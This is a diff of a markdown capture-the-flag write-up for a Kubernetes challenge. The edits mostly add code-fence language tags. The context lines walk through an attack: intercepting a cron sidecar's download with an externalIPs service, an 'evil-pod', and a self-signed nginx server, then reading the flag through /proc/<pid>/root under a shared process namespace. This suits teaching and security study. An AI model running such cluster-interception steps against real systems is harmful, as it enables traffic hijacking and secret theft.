@@ -1,4 +1,5 @@
 ## Supercluster Writeup
+Writeup Award: [here](https://morrisbe.de/awards/Best_Writeup_setko8920_2.pdf)  
 Challenge Author: Diff-fusion  
 Challenge difficulty: Medium  
 Challenge Files: [here](https://morrisbe.de/challenge_files/supercluster.zip)  
@@ -27,7 +28,7 @@ We are shown images of superclusters and short descriptions. Clicking one opens 
 Back to Kubernetes: In theory, being in a different namespace completely isolates us from the flag namespace. We can't escalate or misuse privileges unless our permissions are too lenient. 
 
 However, our service account only has the following cluster-wide privileges:
-```
+```yaml
 ...
 resources: ["namespace", "roles", "clusterroles", "rolebindings", "clusterrolebindings"]
 verbs: ["get", "list", "watch"]
@@ -37,14 +38,14 @@ These privileges help us, but don't give us modifying power of the flag namespac
 Since the flag namespace is where the flag is stored, we are stuck...
 
 Let's keep looking at what we are working with: Using the above capabilities, we can determine that the following pod is running:
-```
+```bash
 # === command ===
 ctf:~$ kubectl get pods -n flag
 # === output ===
 supercluster-h6cnq
 ```
 On this pod, the following (init-)containers and sidecars are running (or ran):
-```
+```bash
 # === command ===
 ctf:~$ kubectl get pod supercluster-h6cnq -n flag -o jsonpath="{.spec.initContainers[*].name} {.spec.containers[*].name}"
 # === output ===
@@ -54,13 +55,13 @@ supercluster-cron
 ```
 Of these, **init-www** is a typical init-container so its execution completed. It copied the initial content of the `/html` folder into `/www`.
 The **supercluster-webserver** is running our website using:
-```
+```bash
 httpd -f -v -h /www -p 8080
 ```
 Which serves the `/www` directory statically. This might become dangerous if (for some weird reason) there were symlinks inside the `/www` directory, allowing us to read any files the symlinks point to on the web-server container (foreshadowing). The web-server container does not mount the `/flag` secret though!
 
 Lastly, **supercluster-cron** is a sidecar that has read/write access to the `/www` directory and has the **flag** mounted. [Sidecars](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/) are secondary containers that run alongside the main application container within the same pod. It runs the following cronjob:
-```
+```bash
 * * * * wget -O /tmp/superclusters.tar.gz https://static.cscg.live/ccceaebec38a3e60436789e9108a3a0e9a34532fd8ef2a98b0acf0b686d9a666/superclusters.tar.gz && tar -x --overwrite -C /www -f /tmp/superclusters.tar.gz; rm /tmp/superclusters.tar.gz
 ```
 This cronjob fetches a remote .tar.gz file, unpacks it, and places its content into the `/www` directory.
@@ -80,7 +81,7 @@ Kubernetes API server in all versions allows an attacker who is able to create a
 ```
 
 Nice, so let's first figure out what the IP address of `static.cscg.live` is so we can create a service with its external IPs:
-``` 
+``` bash
 # === commands ===
 ctf:~$ dig static.cscg.live
 # === output ===
@@ -95,7 +96,7 @@ The DNS A records reveal the IPs.
 
 As a proof-of-concept, let's deploy a ClusterIP service and a lightweight app. For simplicity, we start with **HTTP**, not HTTPS. To do this, we create a new .yaml file and deploy a pod + service that serves "Hello" and has the `externalPs` set to those of `static.cscg.live`. To ensure we stay within our privileges, we need to add the right security context and resource limits (leaving them out throws errors indicating their requirement).
 *Note: Don't use pods this way when you actually want to deploy a real service. Pods have different behavior and restart policies than deployments. In this case, it was simply more compact.*
-```
+```bash
 cat << 'EOF' > evilpod.yaml
 apiVersion: v1
 kind: Pod
@@ -149,7 +150,7 @@ EOF
 ```
 
 We deploy it:
-```
+```bash
 # Deploy the pod
 # === command ===
 ctf:~$ kubectl apply -f evilpod.yaml --force
@@ -158,7 +159,7 @@ pod/evil-pod configured
 service/evil-server configured
 ```
 Then, for testing purposes, see what this returns to our request:
-```
+```bash
 # === commands ===
 $ctf: sudo apt update
 $ctf: sudo apt install wget
@@ -173,7 +174,7 @@ Let's self-sign a certificate with Nginx, and this time make our service actuall
 (The code for this is in the *Full Solve Script (flag)* section to avoid a huge duplicate).
 
 After running wget from the service account, we now get:
-```
+```bash
 # === command ===
 ctf:~$ wget http://static.cscg.live/
 # === Output ===
@@ -184,7 +185,7 @@ Self-signed certificate encountered
 ```
 
 All right, so that did not work. To see what's wrong, let's give ourselves cluster-admin privileges by uncommenting the admin lines in the `minikube-1-permissions.yaml` and try the same request from the supercluster-cron sidecar. This returns the following response:
-```
+```bash
 # === command ===
 ctf:~$ kubectl exec -c supercluster-cron -n flag -it supercluster-h6cnq -- wget http://static.cscg.live/
 # === output ===
@@ -201,7 +202,7 @@ The first thing we'd want to try is simply inserting a symlink straight to the `
 Back to the drawing board.
 
 The supercluster app has the following configuration:
-```
+```yaml
 shareProcessNamespace: true
 ```
 With a quick Google search, we find the following information:
@@ -211,7 +212,7 @@ This is not a vulnerability per se, as this is the intended behavior of this con
 Since we know how to access the root directory of any process now, knowing `/flag` is mounted at the root of supercluster-cron, we just need to guess this container's process ID and access `/proc/<id>/root/flag/flag` to access the flag. 
 
 Luckily, we just need to guess the process ID once: the containers are always launched in the same order. Let's not do all that that though, and just use the admin privileges we unlocked previously to determine the PID on our local instance.
-```
+```bash
 # === command ===
 $ctf: kubectl exec -n flag supercluster-h6cnq -c supercluster-webserver -- ps ax
 # === Output ===
@@ -224,7 +225,7 @@ PID   USER     TIME  COMMAND
 So the process ID of the cronjob is 13. That gives us everything we need. 
 ### Full Solve Script (flag)
 This is the final solve script. To briefly summarize, it creates a self-signed TLS certificate and produces the .tar.gz files. It then uses ConfigMaps to configure nginx before it launches the required pod and service.
-```
+```bash
 openssl req -x509 -nodes -days 365 \
   -newkey rsa:2048 \
   -keyout tls.key -out tls.crt \
